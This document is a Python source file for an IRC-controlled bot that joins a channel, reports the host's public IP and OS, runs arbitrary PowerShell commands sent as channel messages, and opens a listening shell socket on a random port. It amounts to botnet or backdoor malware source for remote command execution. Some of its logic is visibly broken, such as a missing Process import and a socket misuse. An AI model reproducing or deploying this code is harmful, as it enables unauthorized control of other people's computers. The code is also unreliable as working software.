#!/usr/bin/python3
# -*- coding: utf-8 -*-
import pydle
from requests import get

# from deps.multiprocessing import Process
import socket
import random

# import deps.pypsrp
# import deps.sys
# def check_valid_key():
import subprocess
import os, sys, time

# subprocess.call('C:\Windows\System32\powershell.exe Get-Process', shell=True)

ip = get("https://api.ipify.org").text


class MyOwnBot(pydle.Client):
    async def on_connect(self):
        await self.join("#net")

    async def alert_msg(message):
        await self.message(target, message)

    async def on_message(self, target, source, message):
        # don't respond to our own messages, as this leads to a positive feedback loop
        if message.startswith("!target "):
            message = message.replace("!target ", "")
            if message.startswith(ip):
                command = message.replace(ip, "")
                await self.message(target, "order received !")
                p = subprocess.Popen(["powershell.exe", command], stdout=sys.stdout)
                p.communicate()
            pass

        if message == "!ip":
            await self.message(target, format(ip))

        if message == "!os":
            await self.message(target, getos())

        if message == "!spawn_shell":
            port = random.randint(1025, 3000)
            message = "shell available on " + ip + ":" + str(port)
            await self.message(target, message)
            p = Process(target=shell(port))
            p.start()

        if message == "!stop_shell":
            p.terminate()
            p.join()
            message = "Shell stopped"
            await self.message(target, message)

        if message.startswith("!ps invoke"):
            command = message.replace("!ps invoke", "")
            PowershellInvoke.invoke(command)
            # await self.message(target, message)


class PowershellInvoke:
    def __init__(self, command):
        self.command = command

    def invoke(command):
        # os.system(command)
        # s = subprocess.check_call(["/bin/bash", command] , shell = False)
        # s = subprocess.call("/bin/bash", command)
        # print(", return code", s)

        p = subprocess.Popen(["powershell.exe", command], stdout=sys.stdout)
        p.communicate()
        print(p.communicate())

        # process=subprocess.Popen(["powershell","Get-Childitem C:\\Windows\\*.log"],stdout=subprocess.PIPE)
        # result=process.communicate()[0]
        # print(result)


def shell(port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        hote = ""
        print(hote)
        server.bind((hote, port))
        server.listen(5)
        server.accept()
        while True:
            message = server.recv(1024).decode("utf8")
            if message == "!stop":
                server.send("Server stopping...".encode("utf8"))
                server.close()
                break
            if message == "!getlog":
                process = subprocess.Popen(
                    ["powershell", "Get-Childitem C:\\Windows\\*.log"],
                    stdout=subprocess.PIPE,
                )
                result = process.communicate()[0]
                print(result)
            if message == None:
                pass

    except OSError:
        server.close()
    finally:
        server.close()


def getos():
    import platform

    return platform.system()


def main():
    client = MyOwnBot("BoBiBot", realname="bot")
    while True:
        client.run("localhost", tls=False, tls_verify=False)


if __name__ == "__main__":
    main()
